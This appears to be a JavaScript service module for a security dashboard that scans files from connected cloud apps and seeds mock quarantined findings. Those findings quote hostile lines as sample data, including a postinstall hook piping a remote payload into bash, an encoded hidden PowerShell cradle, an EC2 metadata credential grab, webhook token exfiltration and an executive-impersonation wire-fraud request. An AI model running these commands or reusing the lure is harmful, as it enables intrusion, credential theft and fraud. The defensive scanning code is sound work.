import malwareService from "./malware.service.js";
import Incident from "../models/incident.model.js";
import ThreatLog from "../models/threatLog.model.js";
import { redactPayload, computePayloadHash } from "../utils/redact.js";
import logger from "../utils/logger.js";

// In-memory state for connected integrations with realistic initial synced items
const integrationsState = {
  google_drive: {
    id: "google_drive",
    name: "Google Drive Cloud Storage",
    category: "Cloud Storage",
    icon: "drive",
    connected: true,
    account: "secops.drive@enterprise-corp.io",
    syncStatus: "synced",
    lastSync: new Date(Date.now() - 5 * 60 * 1000).toISOString(),
    scannedCount: 142,
    threatsCount: 2,
  },
  gmail: {
    id: "gmail",
    name: "Google Mail (Gmail Workspace)",
    category: "Email Services",
    icon: "mail",
    connected: true,
    account: "admin-secops@enterprise-corp.io",
    syncStatus: "synced",
    lastSync: new Date(Date.now() - 2 * 60 * 1000).toISOString(),
    scannedCount: 289,
    threatsCount: 3,
  },
  outlook: {
    id: "outlook",
    name: "Microsoft Outlook 365",
    category: "Email Services",
    icon: "mail",
    connected: false,
    account: null,
    syncStatus: "disconnected",
    lastSync: null,
    scannedCount: 0,
    threatsCount: 0,
  },
  github: {
    id: "github",
    name: "GitHub Enterprise Repositories",
    category: "Source Code & CI/CD",
    icon: "git",
    connected: true,
    account: "enterprise-secops-org",
    syncStatus: "synced",
    lastSync: new Date(Date.now() - 15 * 60 * 1000).toISOString(),
    scannedCount: 94,
    threatsCount: 1,
  },
  slack: {
    id: "slack",
    name: "Slack Team File Drops",
    category: "Collaboration",
    icon: "slack",
    connected: false,
    account: null,
    syncStatus: "disconnected",
    lastSync: null,
    scannedCount: 0,
    threatsCount: 0,
  },
  aws_s3: {
    id: "aws_s3",
    name: "AWS S3 Corporate Storage",
    category: "Cloud Storage",
    icon: "cloud",
    connected: false,
    account: null,
    syncStatus: "disconnected",
    lastSync: null,
    scannedCount: 0,
    threatsCount: 0,
  },
};

// Seed initial scanned items across connected apps
let syncedItems = [
  {
    id: "item-drv-101",
    appId: "google_drive",
    appName: "Google Drive",
    name: "Q4_Financial_Summary.pdf",
    itemType: "document",
    sourceLocation: "/My Drive/Corporate Documents/",
    sizeBytes: 245120,
    scanDate: new Date(Date.now() - 10 * 60 * 1000).toISOString(),
    status: "clean",
    verdict: "SAFE",
    riskScore: 0,
    findings: [],
    quarantined: false,
  },
  {
    id: "item-drv-102",
    appId: "google_drive",
    appName: "Google Drive",
    name: "Google_Drive_Setup.exe",
    itemType: "executable",
    sourceLocation: "/Shared with me/External Collaborator/",
    sizeBytes: 154800,
    scanDate: new Date(Date.now() - 15 * 60 * 1000).toISOString(),
    status: "infected",
    verdict: "MALICIOUS",
    riskScore: 90,
    findings: [
      {
        id: "MAL-DRIVE-010",
        name: "Cloud Drive Trojan / Phishing Template",
        category: "Cloud Storage Threat",
        severity: "high",
        line: 1,
        matchedSnippet: "Google_Drive_Setup.exe: disguised external payload dropped in sync folder",
      },
    ],
    quarantined: true,
  },
  {
    id: "item-gml-201",
    appId: "gmail",
    appName: "Gmail",
    name: "Invoice_94821.pdf.vbs",
    itemType: "email_attachment",
    sourceLocation: "From: billing-update@urgent-notification.xyz [Subject: Overdue Payment Notice]",
    sizeBytes: 12400,
    scanDate: new Date(Date.now() - 8 * 60 * 1000).toISOString(),
    status: "infected",
    verdict: "MALICIOUS",
    riskScore: 95,
    findings: [
      {
        id: "MAL-MAIL-009",
        name: "Weaponized Email Attachment / Malicious Macro",
        category: "Email Threat",
        severity: "critical",
        line: 1,
        matchedSnippet: "Invoice_94821.pdf.vbs (Dual extension VBScript download cradle)",
      },
      {
        id: "MAL-SH-002",
        name: "Reverse Shell / Remote Command Execution",
        category: "Reverse Shell",
        severity: "critical",
        line: 4,
        matchedSnippet: "powershell.exe -w hidden -enc JABjAGwAYQ... (Base64 payload cradle)",
      },
    ],
    quarantined: true,
  },
  {
    id: "item-gml-202",
    appId: "gmail",
    appName: "Gmail",
    name: "Weekly_SecOps_Status_Report.eml",
    itemType: "email_message",
    sourceLocation: "From: alerts@monitoring.internal [Subject: Daily SecOps Digest]",
    sizeBytes: 18400,
    scanDate: new Date(Date.now() - 22 * 60 * 1000).toISOString(),
    status: "clean",
    verdict: "SAFE",
    riskScore: 0,
    findings: [],
    quarantined: false,
  },
  {
    id: "item-git-301",
    appId: "github",
    appName: "GitHub",
    name: "package.json (PR #14: Added Fast Stream Utility)",
    itemType: "repo_commit",
    sourceLocation: "Repo: enterprise-secops-org/api-gateway [Branch: main]",
    sizeBytes: 3420,
    scanDate: new Date(Date.now() - 35 * 60 * 1000).toISOString(),
    status: "infected",
    verdict: "MALICIOUS",
    riskScore: 95,
    findings: [
      {
        id: "MAL-PKG-006",
        name: "Abusive Pre/Postinstall Lifecycle Script",
        category: "Supply Chain",
        severity: "critical",
        line: 8,
        matchedSnippet: '"postinstall": "curl -s http://194.26.29.112/payload.sh | bash"',
      },
    ],
    quarantined: true,
  },
  {
    id: "item-aws-401",
    appId: "aws_s3",
    appName: "AWS S3 Corporate Storage",
    name: "s3_iam_secret_exfiltration.sh",
    itemType: "cloud_script",
    sourceLocation: "s3://enterprise-prod-vault/ops/bootstrap/s3_iam_secret_exfiltration.sh",
    sizeBytes: 8120,
    scanDate: new Date(Date.now() - 40 * 60 * 1000).toISOString(),
    status: "infected",
    verdict: "MALICIOUS",
    riskScore: 92,
    findings: [
      {
        id: "MAL-AWS-003",
        name: "Cloud IAM Key Harvester & S3 Exfiltration",
        category: "Cloud Credentials",
        severity: "critical",
        line: 5,
        matchedSnippet: 'curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      },
    ],
    quarantined: true,
  },
  {
    id: "item-aws-402",
    appId: "aws_s3",
    appName: "AWS S3 Corporate Storage",
    name: "db_cluster_snapshot_2026.enc",
    itemType: "cloud_storage",
    sourceLocation: "s3://enterprise-cold-backups/database/db_cluster_snapshot_2026.enc",
    sizeBytes: 104857600,
    scanDate: new Date(Date.now() - 60 * 60 * 1000).toISOString(),
    status: "clean",
    verdict: "SAFE",
    riskScore: 0,
    findings: [],
    quarantined: false,
  },
  {
    id: "item-out-501",
    appId: "outlook",
    appName: "Microsoft Outlook 365",
    name: "Wire_Transfer_Routing_Notice.eml",
    itemType: "email_message",
    sourceLocation: "From: ceo.office@lookalike-corp.com [Subject: URGENT: Wire Remittance Redirect]",
    sizeBytes: 15400,
    scanDate: new Date(Date.now() - 12 * 60 * 1000).toISOString(),
    status: "infected",
    verdict: "MALICIOUS",
    riskScore: 95,
    findings: [
      {
        id: "MAL-BEC-002",
        name: "Executive Impersonation & IBAN Redirection",
        category: "Financial BEC Fraud",
        severity: "critical",
        line: 2,
        matchedSnippet: "Please route pending $480,000 contractor payment to new IBAN: GB82BARC20000087654321",
      },
    ],
    quarantined: true,
  },
  {
    id: "item-slk-601",
    appId: "slack",
    appName: "Slack Team File Drops",
    name: "slack_webhook_grabber.py",
    itemType: "chat_attachment",
    sourceLocation: "Channel: #engineering-general [Shared by external guest]",
    sizeBytes: 4210,
    scanDate: new Date(Date.now() - 25 * 60 * 1000).toISOString(),
    status: "infected",
    verdict: "MALICIOUS",
    riskScore: 88,
    findings: [
      {
        id: "MAL-SLK-001",
        name: "Slack Webhook Harvester & Token Drainer",
        category: "Token Exfiltration",
        severity: "high",
        line: 3,
        matchedSnippet: "slack-webhook.internal-mock.net/services/T00000000/B00000000/XXXX (Unauthorized Webhook Exfiltration)",
      },
    ],
    quarantined: true,
  },
];

/**
 * Get all registered integrations and their connection/threat statistics
 */
export function getIntegrations() {
  return Object.values(integrationsState);
}

/**
 * Connect or disconnect a cloud app
 */
export function toggleConnect(appId, { connect = true, account = null } = {}) {
  const app = integrationsState[appId];
  if (!app) throw new Error(`Integration '${appId}' is not supported.`);

  if (connect) {
    app.connected = true;
    app.account = account || `secops-user@${appId}.enterprise.io`;
    app.syncStatus = "synced";
    app.lastSync = new Date().toISOString();
  } else {
    app.connected = false;
    app.syncStatus = "disconnected";
    app.lastSync = null;
  }
  return app;
}

/**
 * Get list of synced items across all connected apps
 */
export function getSyncedItems({ appId = null, status = null } = {}) {
  let list = [...syncedItems];
  if (appId) {
    list = list.filter((i) => i.appId === appId);
  }
  if (status) {
    list = list.filter((i) => i.status === status);
  }
  return list.sort((a, b) => new Date(b.scanDate) - new Date(a.scanDate));
}

/**
 * Scan an incoming or selected item from a connected app (Drive file, email attachment, repo commit)
 */
export async function scanAppItem({ appId, itemName, itemType, content, sourceLocation, userId, clientIp = "127.0.0.1" }) {
  const app = integrationsState[appId];
  if (!app) throw new Error(`Integration '${appId}' is not supported.`);

  // Run malware scanning engine
  const scanResult = await malwareService.scanForMalware({
    filename: itemName,
    content,
    mimeType: "text/plain",
  });

  const itemId = `item-${appId.slice(0, 3)}-${Date.now().toString().slice(-6)}`;
  const isClean = scanResult.clean;

  const newItem = {
    id: itemId,
    appId,
    appName: app.name,
    name: itemName,
    itemType: itemType || "file",
    sourceLocation: sourceLocation || `Synced from ${app.name}`,
    sizeBytes: Buffer.byteLength(content, "utf8"),
    scanDate: new Date().toISOString(),
    status: isClean ? "clean" : "infected",
    verdict: scanResult.verdict,
    riskScore: scanResult.riskScore,
    findings: scanResult.findings,
    remediation: scanResult.remediation,
    quarantined: !isClean,
  };

  // Prepend to synced items
  syncedItems.unshift(newItem);
  if (syncedItems.length > 50) syncedItems.pop();

  // Update app stats
  app.scannedCount += 1;
  app.lastSync = new Date().toISOString();

  if (!isClean) {
    app.threatsCount += 1;

    // Create Incident & ThreatLog in the database
    const topFinding = scanResult.findings[0] || {};
    const incident = await Incident.create({
      source: "file",
      payloadRedacted: redactPayload(scanResult.findings.map((f) => `${f.name}: ${f.matchedSnippet}`).join(" | "), 300),
      threatVector: `${app.name}: ${topFinding.category || "Malware"}`,
      confidence: scanResult.riskScore,
      status: "open",
    });

    await ThreatLog.create({
      userId: userId || null,
      clientIp,
      channel: "file",
      direction: "inbound",
      attackType: "sensitive_data",
      severity: scanResult.verdict === "MALICIOUS" ? "critical" : "high",
      score: scanResult.riskScore,
      action: "blocked",
      payloadRedacted: redactPayload(`App '${app.name}' Quarantine: ${itemName} - ${scanResult.findings.map((f) => f.name).join(", ")}`, 300),
      payloadHash: computePayloadHash(content),
      matchedRules: scanResult.findings.map((f) => f.id),
      llmCalled: false,
      incidentId: incident._id,
      source: "live",
    });

    newItem.incidentId = incident._id.toString();
  }

  logger.info("app_item_scanned", {
    appId,
    itemName,
    verdict: scanResult.verdict,
    riskScore: scanResult.riskScore,
    quarantined: newItem.quarantined,
  });

  return newItem;
}

/**
 * Isolate / quarantine / remove an infected item
 */
export function isolateItem(itemId) {
  const item = syncedItems.find((i) => i.id === itemId);
  if (!item) throw new Error("Item not found");

  item.quarantined = true;
  item.status = "isolated";
  item.isolatedAt = new Date().toISOString();
  return item;
}

/**
 * Perform on-demand sync of a connected app
 */
export async function syncIntegration(appId, { userId, clientIp } = {}) {
  const app = integrationsState[appId];
  if (!app) throw new Error(`Integration '${appId}' is not found.`);
  if (!app.connected) throw new Error(`Integration '${app.name}' is not connected.`);

  app.lastSync = new Date().toISOString();
  app.syncStatus = "synced";

  // Simulate scanning incoming batch if triggered
  let sampleItem = null;
  if (appId === "google_drive") {
    sampleItem = await scanAppItem({
      appId: "google_drive",
      itemName: `Sync_Archive_${Math.floor(Math.random() * 900 + 100)}.zip`,
      itemType: "archive",
      sourceLocation: "/My Drive/Automated Backups/",
      content: JSON.stringify({ backup: true, timestamp: Date.now() }),
      userId,
      clientIp,
    });
  } else if (appId === "gmail" || appId === "outlook") {
    sampleItem = await scanAppItem({
      appId,
      itemName: `Incoming_Mail_${Math.floor(Math.random() * 900 + 100)}.eml`,
      itemType: "email_message",
      sourceLocation: `To: ${app.account} [Status: Verified Inbound TLS]`,
      content: "Received: by mail.gateway with TLS; Content-Type: multipart/alternative; Subject: Scheduled report",
      userId,
      clientIp,
    });
  } else if (appId === "aws_s3") {
    sampleItem = await scanAppItem({
      appId: "aws_s3",
      itemName: `s3_object_log_${Math.floor(Math.random() * 900 + 100)}.json`,
      itemType: "cloud_storage",
      sourceLocation: "s3://enterprise-prod-vault/audit-logs/",
      content: JSON.stringify({ bucket: "enterprise-prod-vault", status: "monitored", verifiedAt: Date.now() }),
      userId,
      clientIp,
    });
  } else if (appId === "slack") {
    sampleItem = await scanAppItem({
      appId: "slack",
      itemName: `channel_snippet_${Math.floor(Math.random() * 900 + 100)}.txt`,
      itemType: "chat_attachment",
      sourceLocation: "Channel: #security-briefings [Workspace File Drop]",
      content: "Routine SecOps notice: System patch applied successfully. No vulnerabilities identified.",
      userId,
      clientIp,
    });
  } else if (appId === "github") {
    sampleItem = await scanAppItem({
      appId: "github",
      itemName: `commit_${Math.floor(Math.random() * 900 + 100)}.patch`,
      itemType: "repo_commit",
      sourceLocation: "Repo: enterprise-secops-org/api-gateway [Branch: release]",
      content: "diff --git a/server.js b/server.js\n// Clean production commit verified",
      userId,
      clientIp,
    });
  }

  return {
    app,
    scannedItem: sampleItem,
  };
}

export default {
  getIntegrations,
  toggleConnect,
  getSyncedItems,
  scanAppItem,
  isolateItem,
  syncIntegration,
};
